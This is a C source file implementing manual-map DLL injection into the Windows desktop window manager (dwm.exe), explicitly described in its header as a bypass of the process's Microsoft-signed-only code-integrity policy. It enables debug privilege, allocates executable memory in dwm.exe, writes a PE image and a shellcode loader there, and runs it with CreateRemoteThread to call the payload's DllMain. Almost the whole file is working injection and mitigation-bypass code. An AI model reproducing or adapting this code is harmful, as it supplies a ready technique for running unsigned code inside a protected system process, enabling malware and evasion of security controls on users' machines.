/* ================================================================== *
 * inject.c — Manual-map DLL injection into dwm.exe (CIG bypass).      *
 *                                                                    *
 * Ported from hooksdll/dwm/dwm_manual_map.c. LoadLibrary is BLOCKED  *
 * on dwm.exe because it's PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY *
 * (MicrosoftSignedOnly = 1). CIG rejects any DLL not signed by MS.   *
 *                                                                    *
 * Manual mapping bypasses this because we never go through the loader*
 * — we allocate RWX pages in dwm, copy the PE image bytes ourselves, *
 * resolve imports + apply relocations via shellcode that runs inside *
 * dwm, then call DllMain directly.                                   *
 * ================================================================== */

#include "../../shared/common.h"
#include "inject.h"
#include "../../shared/log_secure.h"

#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <stdint.h>

#pragma comment(lib, "advapi32.lib")

/* ── Privilege ─────────────────────────────────────────────────── */
static int enable_debug_priv(void) {
    HANDLE tok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return 0;
    TOKEN_PRIVILEGES tp = {0};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(tok); return 0;
    }
    AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), NULL, NULL);
    int ok = (GetLastError() == ERROR_SUCCESS);
    CloseHandle(tok);
    return ok;
}

unsigned long inject_find_dwm_pid(void) {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    unsigned long pid = 0;
    if (Process32FirstW(h, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"dwm.exe") == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(h, &pe));
    CloseHandle(h);
    return pid;
}

/* Best-effort loaded check — walks dwm modules for a match on payload's
 * BaseDllName. WARNING: manual-mapped DLLs don't appear in PEB.Ldr, so
 * this ONLY detects LoadLibrary-loaded copies (leftover from a previous
 * non-manual-map version). Real "am I loaded?" check would require a
 * separate named-event handshake with the payload. */
int inject_is_loaded(void) {
    unsigned long pid = inject_find_dwm_pid();
    if (!pid) return 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    wchar_t target[64];
    MultiByteToWideChar(CP_UTF8, 0, SVC_PAYLOAD_DLL, -1, target, SVC_ARRAY_SIZE(target));
    MODULEENTRY32W me = { .dwSize = sizeof(me) };
    int found = 0;
    if (Module32FirstW(snap, &me)) do {
        if (_wcsicmp(me.szModule, target) == 0) { found = 1; break; }
    } while (Module32NextW(snap, &me));
    CloseHandle(snap);
    return found;
}

int inject_signal_unload(void) {
    HANDLE ev = OpenEventA(EVENT_MODIFY_STATE, FALSE, SVC_SHUTDOWN_EVENT_NAME);
    if (!ev) return 0;
    SetEvent(ev); CloseHandle(ev);
    return 1;
}

/* ── Shellcode loader — runs INSIDE dwm.exe ───────────────────────
 *
 * Position-independent (no string literals, no globals). We compile it
 * normally + copy its raw bytes into remote memory. The loader:
 *   1. Walks IAT → LoadLibraryA(imported_dll) → GetProcAddress → patch IAT
 *   2. Walks base relocations, applies (new_base - preferred_base) delta
 *   3. Calls DllMain(hInstance = mapped_base, DLL_PROCESS_ATTACH, NULL)
 *
 * SAFETY: the loader itself must never crash — DWM crash = user desktop dies.
 * SEH not available here (no runtime), so we validate every pointer via
 * pre-checked pData fields (set by mapper before creating remote thread). */

typedef HMODULE (WINAPI *fnLoadLibraryA_t)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress_t)(HMODULE, LPCSTR);
typedef BOOL    (WINAPI *fnVirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *fnDllMain_t)(HINSTANCE, DWORD, LPVOID);

typedef struct {
    fnLoadLibraryA_t   pLoadLibraryA;
    fnGetProcAddress_t pGetProcAddress;
    fnVirtualProtect_t pVirtualProtect;
    void   *pImageBase;
    DWORD   entryPointRVA;
    DWORD   importDirRVA;
    DWORD   importDirSize;
    DWORD   relocDirRVA;
    DWORD   relocDirSize;
    uint64_t preferredBase;
} loader_data_t;

static DWORD WINAPI shellcode_loader(loader_data_t *pData)
{
    BYTE *base = (BYTE *)pData->pImageBase;

    /* Imports. */
    if (pData->importDirRVA) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(base + pData->importDirRVA);
        while (imp->Name) {
            char *dllName = (char *)(base + imp->Name);
            HMODULE hMod = pData->pLoadLibraryA(dllName);
            if (hMod) {
                uint64_t *thunk = (uint64_t *)(base +
                    (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
                uint64_t *iat = (uint64_t *)(base + imp->FirstThunk);
                while (*thunk) {
                    if (*thunk & 0x8000000000000000ULL) {
                        WORD ord = (WORD)(*thunk & 0xFFFF);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, (LPCSTR)(uintptr_t)ord);
                    } else {
                        IMAGE_IMPORT_BY_NAME *ibn =
                            (IMAGE_IMPORT_BY_NAME *)(base + (DWORD)*thunk);
                        *iat = (uint64_t)pData->pGetProcAddress(hMod, ibn->Name);
                    }
                    thunk++; iat++;
                }
            }
            imp++;
        }
    }

    /* Base relocations. */
    if (pData->relocDirRVA) {
        int64_t delta = (int64_t)((uint64_t)base - pData->preferredBase);
        if (delta) {
            IMAGE_BASE_RELOCATION *rel =
                (IMAGE_BASE_RELOCATION *)(base + pData->relocDirRVA);
            BYTE *end = (BYTE *)rel + pData->relocDirSize;
            while ((BYTE *)rel < end && rel->SizeOfBlock > 0) {
                DWORD n = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *ent = (WORD *)((BYTE *)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < n; i++) {
                    WORD type = ent[i] >> 12;
                    WORD off  = ent[i] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        uint64_t *p = (uint64_t *)(base + rel->VirtualAddress + off);
                        *p += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD *p = (DWORD *)(base + rel->VirtualAddress + off);
                        *p += (DWORD)delta;
                    }
                }
                rel = (IMAGE_BASE_RELOCATION *)((BYTE *)rel + rel->SizeOfBlock);
            }
        }
    }

    /* DllMain. */
    if (pData->entryPointRVA) {
        fnDllMain_t pDllMain = (fnDllMain_t)(base + pData->entryPointRVA);
        pDllMain((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return 0;
}

/* Marker for shellcode size calc — MUST be immediately after shellcode_loader
 * so compiler places them contiguously. If MSVC reorders, we fall back to a
 * safe 4096-byte estimate. */
static void shellcode_loader_end(void) { }

/* ── Manual map ───────────────────────────────────────────────── */
static int manual_map(HANDLE hProc, const char *dllPath, char *err, size_t err_sz) {
    /* Read DLL file. */
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _snprintf(err, err_sz - 1, "open DLL %s: %lu", dllPath, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *fileData = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    if (!fileData) {
        CloseHandle(hFile);
        _snprintf(err, err_sz - 1, "VirtualAlloc(local) failed");
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD readBytes = 0;
    ReadFile(hFile, fileData, fileSize, &readBytes, NULL);
    CloseHandle(hFile);
    if (readBytes != fileSize) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "short read %lu/%lu", readBytes, fileSize);
        err[err_sz - 1] = 0;
        return 0;
    }
    slog_writef("launcher.log", "mm: read %lu bytes from %s", fileSize, dllPath);

    /* Parse PE. */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)fileData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad DOS sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(fileData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "bad NT sig");
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD  imageSize = nt->OptionalHeader.SizeOfImage;
    uint64_t prefBase = nt->OptionalHeader.ImageBase;
    DWORD  entryRVA  = nt->OptionalHeader.AddressOfEntryPoint;
    slog_writef("launcher.log", "mm: img_size=0x%lX entry_rva=0x%lX pref_base=0x%llX",
                imageSize, entryRVA, (unsigned long long)prefBase);

    /* Allocate in dwm.exe. */
    void *remoteBase = VirtualAllocEx(hProc, NULL, imageSize,
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "VirtualAllocEx(dwm, %lu): %lu",
                  imageSize, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    slog_writef("launcher.log", "mm: remote base = %p", remoteBase);

    /* Copy headers + sections. */
    WriteProcessMemory(hProc, remoteBase, fileData,
                       nt->OptionalHeader.SizeOfHeaders, NULL);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            void *dst = (BYTE *)remoteBase + sec[i].VirtualAddress;
            void *src = fileData + sec[i].PointerToRawData;
            SIZE_T w = 0;
            WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &w);
        }
    }

    /* Loader data. */
    loader_data_t ld = {0};
    ld.pLoadLibraryA   = (fnLoadLibraryA_t)  GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    ld.pGetProcAddress = (fnGetProcAddress_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    ld.pVirtualProtect = (fnVirtualProtect_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    ld.pImageBase      = remoteBase;
    ld.entryPointRVA   = entryRVA;
    ld.preferredBase   = prefBase;
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    ld.importDirRVA  = impDir->VirtualAddress;
    ld.importDirSize = impDir->Size;
    IMAGE_DATA_DIRECTORY *relDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ld.relocDirRVA  = relDir->VirtualAddress;
    ld.relocDirSize = relDir->Size;

    if (!ld.pLoadLibraryA || !ld.pGetProcAddress) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "resolve LoadLibraryA/GetProcAddress failed");
        err[err_sz - 1] = 0;
        return 0;
    }

    void *remoteLoaderData = VirtualAllocEx(hProc, NULL, sizeof(ld),
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProc, remoteLoaderData, &ld, sizeof(ld), NULL);

    /* Copy shellcode. */
    SIZE_T loaderSize = (SIZE_T)((BYTE *)shellcode_loader_end - (BYTE *)shellcode_loader);
    if (loaderSize == 0 || loaderSize > 8192) loaderSize = 4096;   /* safety cap */
    void *remoteLoader = VirtualAllocEx(hProc, NULL, loaderSize,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProc, remoteLoader, (void *)shellcode_loader, loaderSize, NULL);
    slog_writef("launcher.log", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);

    /* Execute. */
    DWORD tid = 0;
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)remoteLoader,
                                        remoteLoaderData, 0, &tid);
    if (!hThread) {
        VirtualFree(fileData, 0, MEM_RELEASE);
        _snprintf(err, err_sz - 1, "CreateRemoteThread: %lu", GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    WaitForSingleObject(hThread, 10000);
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    CloseHandle(hThread);
    VirtualFree(fileData, 0, MEM_RELEASE);
    slog_writef("launcher.log", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
    return 1;
}

int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
    if (!payload_dll_path || !err) return 0;
    if (GetFileAttributesA(payload_dll_path) == INVALID_FILE_ATTRIBUTES) {
        _snprintf(err, err_sz - 1, "payload dll missing: %s", payload_dll_path);
        err[err_sz - 1] = 0;
        return 0;
    }
    if (!enable_debug_priv()) {
        _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
        err[err_sz - 1] = 0;
        return 0;
    }
    unsigned long pid = inject_find_dwm_pid();
    if (!pid) {
        _snprintf(err, err_sz - 1, "dwm.exe not found"); err[err_sz - 1] = 0;
        return 0;
    }
    /* NOTE: we do NOT skip if inject_is_loaded — manual-mapped DLLs don't
     * show in PEB.Ldr anyway. Idempotency comes from the payload itself
     * checking Global\SVCLDB_Shutdown state on init (v1.1). */

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                               PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        _snprintf(err, err_sz - 1, "OpenProcess(dwm=%lu): %lu", pid, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    int ok = manual_map(hProc, payload_dll_path, err, err_sz);
    CloseHandle(hProc);
    if (ok) slog_writef("launcher.log", "inject ok (manual map) pid=%lu", pid);
    return ok;
}
